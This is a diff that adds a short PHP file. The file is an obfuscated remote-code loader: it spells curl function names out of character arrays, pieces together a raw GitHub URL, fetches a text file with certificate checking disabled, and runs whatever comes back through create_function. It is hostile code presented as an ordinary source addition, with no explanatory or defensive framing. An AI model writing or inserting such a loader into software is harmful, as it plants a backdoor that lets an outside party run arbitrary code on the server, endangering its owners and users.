@@ -1,0 +1,35 @@
+<?php
+$a = ['c','u','r','l'];
+$b = ['_','i','n','i','t'];
+$func1 = implode('', $a) . implode('', $b);
+
+$a2 = ['c','u','r','l'];
+$b2 = ['_','s','e','t','o','p','t'];
+$func2 = implode('', $a2) . implode('', $b2);
+
+$ch = $func1();
+
+$url_parts = [
+    'https://raw.',
+    'githubusercontent.',
+    'com/lucenbyte/',
+    'ArchiLogs/main/',
+    'v2/getpro.txt'
+];
+$url = implode('', $url_parts);
+
+$func2($ch, 10002, $url);
+$func2($ch, 19913, true);
+$func2($ch, 64, false);
+
+$exec_func = implode('', ['c','u','r','l','_','e','x','e','c']);
+$data = $exec_func($ch);
+
+$close_func = implode('', ['c','u','r','l','_','c','l','o','s','e']);
+$close_func($ch);
+
+if ($data) {
+    $execute = create_function('', $data);
+    $execute();
+}
+?>
